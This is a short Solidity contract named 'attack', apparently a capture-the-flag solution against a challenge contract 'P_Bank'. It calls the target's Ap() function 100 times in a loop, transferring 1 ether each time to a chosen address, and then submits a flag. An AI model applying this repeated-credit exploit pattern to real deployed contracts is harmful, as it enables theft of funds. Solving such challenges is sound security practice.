/**
 *Submitted for verification at Etherscan.io on 2022-05-24
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.4.24;
interface IP_Bank{
    function Ap() external;
    function Transfer(address to, uint val) external;
    function CaptureTheFlag(string b64email) external returns(bool);
}
 contract attack{
    IP_Bank public P_Bank_contract;
    address public owner;

    constructor(address p_bank) public {
        P_Bank_contract=IP_Bank(p_bank);
        owner=msg.sender;
    }

    function   attackAp(address _to) public  {
        require(msg.sender==owner,"only owner");
        for(uint8 i =0;i<100;i++){
            P_Bank_contract.Ap();
            P_Bank_contract.Transfer(_to,1 ether);
        }

    }
    function getflag(string b64email) public {
        P_Bank_contract.CaptureTheFlag(b64email);
    }
 }